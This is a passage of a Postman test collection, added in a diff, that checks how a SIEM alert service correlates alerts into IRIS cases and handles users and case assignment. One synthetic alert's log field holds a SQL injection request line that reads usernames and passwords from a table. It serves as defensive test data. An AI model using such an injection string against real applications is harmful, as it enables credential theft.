+              "raw": "{\n  \"id\": \"corr-1\",\n  \"timestamp\": \"2026-10-01T19:00:00.000+0000\",\n  \"rule\": {\n    \"id\": \"5763\",\n    \"level\": 12,\n    \"description\": \"sshd: brute force trying to get access to the system\",\n    \"groups\": [\n      \"authentication_failures\"\n    ],\n    \"mitre\": {\n      \"id\": [\n        \"T1110.001\"\n      ],\n      \"tactic\": [\n        \"Credential Access\"\n      ],\n      \"technique\": [\n        \"Password Guessing\"\n      ]\n    }\n  },\n  \"agent\": {\n    \"id\": \"003\",\n    \"name\": \"lab-web01\",\n    \"ip\": \"10.64.0.21\"\n  },\n  \"data\": {\n    \"srcip\": \"{{corr_ip}}\",\n    \"dstuser\": \"root\"\n  },\n  \"full_log\": \"sshd: brute force trying to get access to the system from {{corr_ip}}\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "event": [
+            {
+              "listen": "prerequest",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "// Futtatasonkent uj forras IP, hogy a korabbi futtatasok esetei ne zavarjanak be.",
+                  "const r = () => Math.floor(Math.random() * 254) + 1;",
+                  "pm.collectionVariables.set('corr_ip', `198.18.${r()}.${r()}`);",
+                  "pm.collectionVariables.set('corr_ip_other', `198.19.${r()}.${r()}`);",
+                  "['corr_first', 'corr_case', 'corr_second'].forEach((k) => pm.collectionVariables.unset(k));"
+                ]
+              }
+            },
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202 (escalated) or 502 (IRIS unreachable)', () => pm.expect([202, 502]).to.include(pm.response.code));",
+                  "if (pm.response.code === 202) {",
+                  "  const json = pm.response.json();",
+                  "  pm.test('first alert of the IP is not correlated', () => pm.expect(json.correlated_with).to.be.null);",
+                  "  if (json.status === 'escalated') {",
+                  "    pm.collectionVariables.set('corr_first', json.id);",
+                  "    pm.collectionVariables.set('corr_case', json.case.case_id);",
+                  "    console.log('Correlation case: ' + json.case.case_url);",
+                  "  }",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Same rule, same IP -> added to the existing case",
+          "id": "da07cd67-9445-4d23-8fda-bfcc334e0236",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": "Check in IRIS: no new case; the existing case got a new notes group `SIEMantics ID-<n>` whose triage note starts with 'Correlated with ID-<first>', a second timeline event linked to the same asset and IOC (no duplicate IOC/asset), and the `ID-<n>` + `correlated` tags.",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"corr-2\",\n  \"timestamp\": \"2026-10-01T19:00:00.000+0000\",\n  \"rule\": {\n    \"id\": \"5763\",\n    \"level\": 12,\n    \"description\": \"sshd: brute force trying to get access to the system\",\n    \"groups\": [\n      \"authentication_failures\"\n    ],\n    \"mitre\": {\n      \"id\": [\n        \"T1110.001\"\n      ],\n      \"tactic\": [\n        \"Credential Access\"\n      ],\n      \"technique\": [\n        \"Password Guessing\"\n      ]\n    }\n  },\n  \"agent\": {\n    \"id\": \"003\",\n    \"name\": \"lab-web01\",\n    \"ip\": \"10.64.0.21\"\n  },\n  \"data\": {\n    \"srcip\": \"{{corr_ip}}\",\n    \"dstuser\": \"root\"\n  },\n  \"full_log\": \"sshd: brute force trying to get access to the system from {{corr_ip}}\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202 (escalated) or 502 (IRIS unreachable)', () => pm.expect([202, 502]).to.include(pm.response.code));",
+                  "const json = pm.response.code === 202 ? pm.response.json() : null;",
+                  "const first = pm.collectionVariables.get('corr_first');",
+                  "const firstCase = pm.collectionVariables.get('corr_case');",
+                  "if (json && json.status === 'escalated' && firstCase) {",
+                  "  pm.test('added to the case of the first alert', () => {",
+                  "    pm.expect(json.correlated_with).to.eql(first);",
+                  "    pm.expect(String(json.case.case_id)).to.eql(String(firstCase));",
+                  "  });",
+                  "  pm.collectionVariables.set('corr_second', json.id);",
+                  "} else if (json) {",
+                  "  console.log(pm.info.requestName + ': status ' + json.status + ' - correlation not checked (no escalated first alert)');",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Other rule, same MITRE technique (T1110.003), same IP -> same case, severity raised",
+          "id": "9e49fd23-29b2-42ee-90c2-e3febb05752f",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": "T1110.003 and T1110.001 share the base technique T1110. Level 15 = critical: check in IRIS that the case severity was raised to Critical and its name now shows [P1/CRITICAL].",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"corr-3\",\n  \"timestamp\": \"2026-10-01T19:00:00.000+0000\",\n  \"rule\": {\n    \"id\": \"60204\",\n    \"level\": 15,\n    \"description\": \"Multiple Windows logon failures (password spraying)\",\n    \"groups\": [\n      \"authentication_failures\"\n    ],\n    \"mitre\": {\n      \"id\": [\n        \"T1110.003\"\n      ],\n      \"tactic\": [\n        \"Credential Access\"\n      ],\n      \"technique\": [\n        \"Password Spraying\"\n      ]\n    }\n  },\n  \"agent\": {\n    \"id\": \"003\",\n    \"name\": \"lab-web01\",\n    \"ip\": \"10.64.0.21\"\n  },\n  \"data\": {\n    \"srcip\": \"{{corr_ip}}\",\n    \"dstuser\": \"root\"\n  },\n  \"full_log\": \"Multiple Windows logon failures (password spraying) from {{corr_ip}}\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202 (escalated) or 502 (IRIS unreachable)', () => pm.expect([202, 502]).to.include(pm.response.code));",
+                  "const json = pm.response.code === 202 ? pm.response.json() : null;",
+                  "const first = pm.collectionVariables.get('corr_first');",
+                  "const firstCase = pm.collectionVariables.get('corr_case');",
+                  "if (json && json.status === 'escalated' && firstCase) {",
+                  "  pm.test('similar by MITRE technique -> same case', () => {",
+                  "    pm.expect(json.correlated_with).to.be.a('string');",
+                  "    pm.expect(String(json.case.case_id)).to.eql(String(firstCase));",
+                  "  });",
+                  "} else if (json) {",
+                  "  console.log(pm.info.requestName + ': status ' + json.status + ' - correlation not checked (no escalated first alert)');",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Different technique (T1190 web exploit) from the same IP -> new case",
+          "id": "a4381f17-0ed3-4fc9-bc95-c4c76c5e55d8",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": "",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"corr-4\",\n  \"timestamp\": \"2026-10-01T19:00:00.000+0000\",\n  \"rule\": {\n    \"id\": \"31106\",\n    \"level\": 12,\n    \"description\": \"Web server 200 response to an SQL injection attempt\",\n    \"groups\": [\n      \"authentication_failures\"\n    ],\n    \"mitre\": {\n      \"id\": [\n        \"T1190\"\n      ],\n      \"tactic\": [\n        \"Initial Access\"\n      ],\n      \"technique\": [\n        \"Exploit Public-Facing Application\"\n      ]\n    }\n  },\n  \"agent\": {\n    \"id\": \"003\",\n    \"name\": \"lab-web01\",\n    \"ip\": \"10.64.0.21\"\n  },\n  \"data\": {\n    \"srcip\": \"{{corr_ip}}\",\n    \"dstuser\": \"root\"\n  },\n  \"full_log\": \"GET /login.php?id=1 UNION SELECT user,pass FROM users HTTP/1.1 200\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202 (escalated) or 502 (IRIS unreachable)', () => pm.expect([202, 502]).to.include(pm.response.code));",
+                  "const json = pm.response.code === 202 ? pm.response.json() : null;",
+                  "const first = pm.collectionVariables.get('corr_first');",
+                  "const firstCase = pm.collectionVariables.get('corr_case');",
+                  "if (json && json.status === 'escalated' && firstCase) {",
+                  "  pm.test('not similar -> not correlated, new case', () => {",
+                  "    pm.expect(json.correlated_with).to.be.null;",
+                  "    pm.expect(String(json.case.case_id)).to.not.eql(String(firstCase));",
+                  "  });",
+                  "} else if (json) {",
+                  "  console.log(pm.info.requestName + ': status ' + json.status + ' - correlation not checked (no escalated first alert)');",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Same rule from another IP -> new case",
+          "id": "f391eeca-2adb-4564-abed-c0c704fd99ef",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": "",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"corr-5\",\n  \"timestamp\": \"2026-10-01T19:00:00.000+0000\",\n  \"rule\": {\n    \"id\": \"5763\",\n    \"level\": 12,\n    \"description\": \"sshd: brute force trying to get access to the system\",\n    \"groups\": [\n      \"authentication_failures\"\n    ],\n    \"mitre\": {\n      \"id\": [\n        \"T1110.001\"\n      ],\n      \"tactic\": [\n        \"Credential Access\"\n      ],\n      \"technique\": [\n        \"Password Guessing\"\n      ]\n    }\n  },\n  \"agent\": {\n    \"id\": \"003\",\n    \"name\": \"lab-web01\",\n    \"ip\": \"10.64.0.21\"\n  },\n  \"data\": {\n    \"srcip\": \"{{corr_ip_other}}\",\n    \"dstuser\": \"root\"\n  },\n  \"full_log\": \"sshd: brute force trying to get access to the system from {{corr_ip_other}}\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202 (escalated) or 502 (IRIS unreachable)', () => pm.expect([202, 502]).to.include(pm.response.code));",
+                  "const json = pm.response.code === 202 ? pm.response.json() : null;",
+                  "const first = pm.collectionVariables.get('corr_first');",
+                  "const firstCase = pm.collectionVariables.get('corr_case');",
+                  "if (json && json.status === 'escalated' && firstCase) {",
+                  "  pm.test('other source IP -> new case', () => {",
+                  "    pm.expect(json.correlated_with).to.be.null;",
+                  "    pm.expect(String(json.case.case_id)).to.not.eql(String(firstCase));",
+                  "  });",
+                  "} else if (json) {",
+                  "  console.log(pm.info.requestName + ': status ' + json.status + ' - correlation not checked (no escalated first alert)');",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Correlated record in the API",
+          "id": "0a7bf12a-be54-40d6-98fb-8b6937a55bf3",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts/{{corr_second}}",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts",
+                "{{corr_second}}"
+              ]
+            },
+            "description": ""
+          },
+          "event": [
+            {
+              "listen": "prerequest",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "// Csak akkor fut, ha a masodik riasztas korrelalodott.",
+                  "if (!pm.collectionVariables.get('corr_second')) {",
+                  "  console.warn('corr_second is not set (IRIS unreachable?) - skipping');",
+                  "  pm.execution && pm.execution.skipRequest ? pm.execution.skipRequest() : null;",
+                  "}"
+                ]
+              }
+            },
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 200', () => pm.response.to.have.status(200));",
+                  "pm.test('record points to the first alert and its case', () => {",
+                  "  const json = pm.response.json();",
+                  "  pm.expect(json.correlated_with).to.eql(pm.collectionVariables.get('corr_first'));",
+                  "  pm.expect(String(json.iris_case_id)).to.eql(String(pm.collectionVariables.get('corr_case')));",
+                  "});"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Similar low-level alert from the same IP (needs_review)",
+          "id": "95abe266-8993-4e9e-8513-ec81f54fe344",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": "",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"corr-6\",\n  \"timestamp\": \"2026-10-01T19:00:00.000+0000\",\n  \"rule\": {\n    \"id\": \"5763\",\n    \"level\": 6,\n    \"description\": \"sshd: authentication failed\",\n    \"groups\": [\n      \"authentication_failures\"\n    ],\n    \"mitre\": {\n      \"id\": [\n        \"T1110.001\"\n      ],\n      \"tactic\": [\n        \"Credential Access\"\n      ],\n      \"technique\": [\n        \"Password Guessing\"\n      ]\n    }\n  },\n  \"agent\": {\n    \"id\": \"003\",\n    \"name\": \"lab-web01\",\n    \"ip\": \"10.64.0.21\"\n  },\n  \"data\": {\n    \"srcip\": \"{{corr_ip}}\",\n    \"dstuser\": \"root\"\n  },\n  \"full_log\": \"sshd: authentication failed from {{corr_ip}}\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202', () => pm.response.to.have.status(202));",
+                  "pm.test('not escalated automatically, so not correlated yet', () => {",
+                  "  const json = pm.response.json();",
+                  "  if (json.status !== 'escalated') pm.expect(json.correlated_with === undefined || json.correlated_with === null).to.be.true;",
+                  "});"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Manual escalation of it -> added to the existing case",
+          "id": "91302053-5251-4af2-a991-eababa00a1e0",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts/{{ref_corr_6}}/escalate",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts",
+                "{{ref_corr_6}}",
+                "escalate"
+              ]
+            },
+            "description": "Check in IRIS: the new notes group of this alert says 'Manually escalated by <user>' and 'Correlated with ID-<first>'."
+          },
+          "event": [
+            {
+              "listen": "prerequest",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "// Ha a hivatkozas hianyzik (elozo mappa nem futott), a kerest atugorjuk.",
+                  "const ref = pm.collectionVariables.get('ref_corr_6');",
+                  "if (!ref) {",
+                  "  console.warn('ref_corr_6 is not set - run folders 1-3 first');",
+                  "  pm.execution && pm.execution.skipRequest ? pm.execution.skipRequest() : null;",
+                  "}"
+                ]
+              }
+            },
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200, 409 if the triage already escalated it, or 502 if IRIS is unreachable', () => {",
+                  "  pm.expect([200, 409, 502]).to.include(pm.response.code);",
+                  "});",
+                  "const firstCase = pm.collectionVariables.get('corr_case');",
+                  "if (pm.response.code === 200 && firstCase) {",
+                  "  pm.test('manual escalation is correlated too (to the latest similar alert of the case)', () => {",
+                  "    const json = pm.response.json();",
+                  "    pm.expect(json.correlated_with).to.match(/^ID-\\d+$/);",
+                  "    pm.expect(String(json.iris_case_id)).to.eql(String(firstCase));",
+                  "  });",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        }
+      ]
+    },
+    {
+      "name": "9. Users, case assignment & auth",
+      "description": "Admin user management, case assignment and the analyst permission rules (analysts may only take an unassigned case or release their own). Needs the IRIS case from folder 7 for the assignment requests (skipped without IRIS). Creates a throwaway `pm-analyst-<timestamp>` user and deactivates it at the end, then logs out.",
+      "item": [
+        {
+          "name": "Login as admin",
+          "id": "14066f76-5919-4f3e-8ef2-adaedb842ef5",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/v1/auth/login",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "auth",
+                "login"
+              ]
+            },
+            "description": "Sets the siemantics_session cookie used by the rest of the folder.",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"username\": \"{{ui_username}}\",\n  \"password\": \"{{ui_password}}\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 200', () => pm.response.to.have.status(200));",
+                  "pm.test('session cookie set', () => pm.expect(pm.cookies.has('siemantics_session')).to.be.true);",
+                  "pm.collectionVariables.set('me_id', pm.response.json().id);"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "List users (admin)",
+          "id": "c3822d07-3015-4e44-90cb-0c8b1ba2655b",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{base_url}}/api/v1/users",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "users"
+              ]
+            },
+            "description": ""
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 200', () => pm.response.to.have.status(200));",
+                  "pm.test('admin is listed', () => {",
+                  "  const me = pm.response.json().find((u) => u.username === pm.collectionVariables.get('ui_username'));",
+                  "  pm.expect(me.role).to.eql('admin');",
+                  "});"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Create analyst user",
+          "id": "b71ec904-069d-4831-be88-cfeffd16007f",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/v1/users",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "users"
+              ]
+            },
+            "description": "",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"username\": \"{{analyst_username}}\",\n  \"full_name\": \"Postman Analyst\",\n  \"password\": \"{{analyst_password}}\",\n  \"role\": \"analyst\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "event": [
+            {
+              "listen": "prerequest",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.collectionVariables.unset('analyst_username');",
+                  "",
+                  "// Egyedi analyst felhasznalonev futtatasonkent.",
+                  "if (!pm.collectionVariables.get('analyst_username')) {",
+                  "  pm.collectionVariables.set('analyst_username', 'pm-analyst-' + Date.now());",
+                  "}"
+                ]
+              }
+            },
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 201', () => pm.response.to.have.status(201));",
+                  "const json = pm.response.json();",
+                  "pm.test('analyst created active', () => {",
+                  "  pm.expect(json.role).to.eql('analyst');",
+                  "  pm.expect(json.is_active).to.be.true;",
+                  "});",
+                  "pm.collectionVariables.set('analyst_id', json.id);"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Create the same username again -> 409",
+          "id": "eb5ba1ba-cea6-4874-9df7-0fea6d8fa508",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/v1/users",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "users"
+              ]
+            },
+            "description": "",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"username\": \"{{analyst_username}}\",\n  \"password\": \"{{analyst_password}}\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 409', () => pm.response.to.have.status(409));"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Create user with too short password -> 422",
+          "id": "0ae19395-fdfb-4b66-a14d-9c4f5d4363d4",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/v1/users",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "users"
+              ]
+            },
+            "description": "",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"username\": \"pm-short-pass\",\n  \"password\": \"short\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 422', () => pm.response.to.have.status(422));"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Update analyst full name",
+          "id": "5bc3930e-09f5-47d6-b6c4-5bdcab4ab845",
+          "request": {
+            "method": "PATCH",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/v1/users/{{analyst_id}}",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "users",
+                "{{analyst_id}}"
+              ]
+            },
+            "description": "",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"full_name\": \"Postman L2 Analyst\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 200', () => pm.response.to.have.status(200));",
+                  "pm.test('full_name updated', () => pm.expect(pm.response.json().full_name).to.eql('Postman L2 Analyst'));"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Admin cannot demote themselves -> 400",
+          "id": "7f2a1593-0774-4df1-bba5-b42ea8684a33",
+          "request": {
+            "method": "PATCH",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/v1/users/{{me_id}}",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "users",
+                "{{me_id}}"
+              ]
+            },
+            "description": "",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"role\": \"analyst\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 400', () => pm.response.to.have.status(400));"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Update unknown user -> 404",
+          "id": "ef453aef-b6d2-42d8-9708-f5aa4f1b5e91",
+          "request": {
+            "method": "PATCH",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/v1/users/999999999",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "users",
+                "999999999"
+              ]
+            },
+            "description": "",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"full_name\": \"x\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 404', () => pm.response.to.have.status(404));"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Assignable users",
+          "id": "174d3bd5-8dd5-4596-a57d-655dc2b1021d",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{base_url}}/api/v1/cases/assignees",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "cases",
+                "assignees"
+              ]
+            },
+            "description": ""
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 200', () => pm.response.to.have.status(200));",
+                  "pm.test('new analyst is assignable', () => {",
+                  "  const ids = pm.response.json().map((u) => u.id);",
+                  "  pm.expect(ids).to.include(Number(pm.collectionVariables.get('analyst_id')));",
+                  "});"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Admin assigns the P1 case to the analyst",
+          "id": "3068f681-9afd-4d73-a8b2-35180beedaba",
+          "request": {
+            "method": "PUT",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/v1/cases/{{case_full}}/assignee",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "cases",
+                "{{case_full}}",
+                "assignee"
+              ]
+            },
+            "description": "",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"user_id\": {{analyst_id}}\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "event": [
+            {
+              "listen": "prerequest",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "// Case nelkul (IRIS nem elerheto) nincs mit hozzarendelni.",
+                  "if (!pm.collectionVariables.get('case_full')) {",
+                  "  console.warn('case_full is not set (IRIS unreachable?) - skipping');",
+                  "  pm.execution && pm.execution.skipRequest ? pm.execution.skipRequest() : null;",
+                  "}"
+                ]
+              }
+            },
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 200', () => pm.response.to.have.status(200));",
+                  "const json = pm.response.json();",
+                  "pm.test('assignee and assigner recorded', () => {",
+                  "  pm.expect(json.assignee.id).to.eql(Number(pm.collectionVariables.get('analyst_id')));",
+                  "  pm.expect(json.assigned_by.username).to.eql(pm.collectionVariables.get('ui_username'));",
+                  "});"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Assignee visible on the alert record",
+          "id": "909086ea-27ca-47c0-90aa-edca392af81c",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts/{{ref_iris_full_content}}",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts",
+                "{{ref_iris_full_content}}"
+              ]
+            },
+            "description": ""
+          },
+          "event": [
+            {
+              "listen": "prerequest",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "// Case nelkul (IRIS nem elerheto) nincs mit hozzarendelni.",
+                  "if (!pm.collectionVariables.get('case_full')) {",
+                  "  console.warn('case_full is not set (IRIS unreachable?) - skipping');",
+                  "  pm.execution && pm.execution.skipRequest ? pm.execution.skipRequest() : null;",
+                  "}"
+                ]
+              }
+            },
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 200', () => pm.response.to.have.status(200));",
+                  "pm.test('assignee is the analyst', () => {",
+                  "  pm.expect(pm.response.json().assignee.id).to.eql(Number(pm.collectionVariables.get('analyst_id')));",
+                  "});"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Assign unknown case -> 404",
+          "id": "438de761-ba8a-48bc-a1d4-bedfeae08e49",
+          "request": {
+            "method": "PUT",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/v1/cases/999999999/assignee",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "cases",
+                "999999999",
+                "assignee"
+              ]
+            },
+            "description": "",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"user_id\": {{me_id}}\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 404', () => pm.response.to.have.status(404));"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Login as the analyst",
+          "id": "ec31c9d7-440a-4e2a-9434-97aae4c736f2",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/v1/auth/login",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "auth",
+                "login"
+              ]
+            },
+            "description": "",
+            "body": {
+              "mode": "raw",
